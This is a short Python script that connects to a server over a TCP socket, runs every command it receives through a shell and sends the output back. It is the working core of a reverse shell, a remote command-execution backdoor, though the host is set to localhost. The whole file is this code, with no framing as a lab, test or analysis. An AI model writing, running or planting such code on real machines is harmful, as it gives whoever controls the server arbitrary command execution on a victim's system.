import socket
import subprocess

HOST = '127.0.0.1'  # Server IP
PORT = 65432        # Server Port

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        data = s.recv(1024)
        if not data:
            break

        command = data.decode().strip()
        if command.lower() == 'exit':
            break

        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True
            )
            output = result.stdout + result.stderr
            if not output:
                output = '[No output]'
        except Exception as e:
            output = f'Error: {str(e)}'

        s.sendall(output.encode('utf-8'))